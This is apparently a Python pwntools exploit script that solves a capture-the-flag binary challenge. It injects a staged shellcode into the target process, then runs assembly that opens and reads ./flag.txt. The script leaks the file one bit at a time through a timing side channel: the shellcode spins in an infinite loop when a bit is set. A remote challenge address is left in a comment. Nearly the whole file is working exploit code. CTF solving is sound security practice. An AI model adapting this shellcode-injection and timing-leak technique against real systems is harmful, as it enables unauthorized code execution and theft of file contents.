from pwn import* 
import string
import subprocess
context.binary=exe=ELF('./chall',checksec=False)
#p=process(exe.path)
#p=remote("103.162.14.240", 15000)
def GDB():
    gdb.attach(p,gdbscript='''
        b*main+548
        c
        ''')
    input()
#GDB()
def shellcode__(index,bit_offset):
    shellcode=asm(
        f'''
        xor rax,rax
        mov al,2
        xor rdi,rdi
        mov edi,0x1337110
        xor rsi,rsi
        xor rdx,rdx
        syscall
        mov edi,eax
        xor rax,rax
        mov dl,0x99
        xor rsi,rsi
        mov esi,0x1337210
        syscall

        mov eax,0x1337210
        add eax,{index}
        mov bl, byte ptr[rax]
        shr bl,{bit_offset}
        shl bl,7
        shr bl,7
        cmp bl,0
        INFI_LOOP:
            cmp bl,0
            je end
            jmp INFI_LOOP
        end:
        '''
        )
    return shellcode
def timing_attack(index):
    string_bin=''
    for bit_offset in range(8):
        
            #p=remote("103.162.14.240", 15000)
            p=process(exe.path)
            #GDB()
            shellcode=b"\x89\xD6\x31\xFF\x0F\x05"
            p.send(shellcode)
            shellcode=b"A"*6
            shellcode+=shellcode__(index,bit_offset)
            shellcode=shellcode.ljust(0x110)
            shellcode+=b'./flag.txt\x00'
            p.send(shellcode)
            start=time.time()
            p.recvall(timeout=1).decode()
            now=time.time()
            if (now-start>1):
                string_bin='1'+string_bin
            else:
                string_bin='0'+string_bin
    byte=int(string_bin,2)
    return byte

flag=''
#character=string.printable
#character="KCSC"+character
#print(character)
for index in range(65):
    flag+=chr(timing_attack(index))
    print(flag)